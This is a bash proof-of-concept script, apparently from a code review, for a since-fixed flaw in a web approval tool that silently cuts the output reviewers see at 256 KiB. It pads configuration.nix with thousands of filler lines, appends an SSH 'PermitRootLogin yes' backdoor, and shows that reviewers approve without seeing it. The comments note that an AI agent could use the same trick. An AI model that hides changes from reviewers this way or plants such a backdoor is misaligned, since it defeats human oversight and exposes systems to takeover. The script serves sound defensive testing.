#!/usr/bin/env bash
# FIXED before merge, found in review of the web-ui branch (web/server.py: drain, rmtree, capped).
# PoC: silent MAX_OUT truncation in web/server.py blinds the reviewer.
#
# web/server.py:171  dec = lambda b: b[:MAX_OUT]...   (no truncation marker)
# review stdout is cut to exactly MAX_OUT (256 KiB) with NO indicator, unlike
# read_capped() which appends "[truncated]". A requester (or the agent itself,
# in ticket/claude mode where the cmd header does not reveal file writes) can
# bury a change past the 256 KiB window: the reviewer's rendered diff just
# ends, they approve, and apply writes the FULL change set.
#
# Usage: web-review-blind.sh <escrow-web-bin> <python3-bin>
# Proves: review body lacks the backdoor line; the applied workspace has it.
set -euo pipefail
WEB=${1:?escrow-web bin}; PY=${2:?python3 bin}
D=$(mktemp -d); trap '[ -n "${SRV-}" ] && kill "$SRV" 2>/dev/null; rm -rf "$D"' EXIT
"$PY" -I - "$D/data" "$WEB" <<'PYE'
import sys, secrets, importlib.util, subprocess, pathlib
# derive server module path from the wrapper to reuse scrypt()
src=subprocess.check_output(["sed","-n","s|.* \\(/nix/store/[^ ]*/server.py\\).*|\\1|p",sys.argv[2]]).decode().strip()
sp=importlib.util.spec_from_file_location("srv",src); m=importlib.util.module_from_spec(sp); sp.loader.exec_module(m)
d=pathlib.Path(sys.argv[1]); d.mkdir(parents=True,exist_ok=True); s=secrets.token_bytes(16)
(d/"users").write_text(f"t {s.hex()} {m.scrypt('poc-password-123',s).hex()}\n")
PYE
"$WEB" serve --data "$D/data" --listen 127.0.0.1:18131 >"$D/log" 2>&1 & SRV=$!
sleep 2; U=http://127.0.0.1:18131
curl -s -c "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' \
  --data-binary '{"user":"t","password":"poc-password-123"}' $U/api/login >/dev/null
"$PY" -I - > "$D/body" <<'PYE'
import json
cmd=("yes '# routine formatting pass ....................................' | head -n 6000 >> configuration.nix; "
     "printf '  services.openssh.settings.PermitRootLogin = \"yes\"; # BACKDOOR\\n' >> configuration.nix")
print(json.dumps({"persona":"alice","mode":"command","text":cmd}))
PYE
curl -s -b "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' --data-binary @"$D/body" $U/api/run > "$D/run"
RID=$("$PY" -I -c 'import json,re;print(re.search(r"proposed (\w+)",json.load(open("'"$D"'/run"))["stderr"]).group(1))')
rj(){ "$PY" -I -c 'import json;print(json.dumps({"id":"'"$RID"'","persona":"'"$1"'"}))'; }
curl -s -b "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' --data-binary "$(rj bob)"   $U/api/review > "$D/rev"
curl -s -b "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' --data-binary "$(rj bob)"   $U/api/review >/dev/null
curl -s -b "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' --data-binary "$(rj carol)" $U/api/sign  >/dev/null
curl -s -b "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' --data-binary "$(rj carol)" $U/api/apply >/dev/null
"$PY" -I - "$D" <<'PYE'
import json,sys,pathlib
D=pathlib.Path(sys.argv[1]); s=json.load(open(D/"rev"))["stdout"]
print("review bytes shown to reviewer:", len(s))
print("reviewer saw the backdoor diff line? ->", "PermitRootLogin" in "\n".join(s.splitlines()[9:]))
print("truncation marker present?           ->", "truncat" in s.lower())
cfg=(D/"data/world/ops/configuration.nix").read_text().splitlines()
print("backdoor applied on disk at line     ->", next(i+1 for i,l in enumerate(cfg) if "BACKDOOR" in l))
PYE
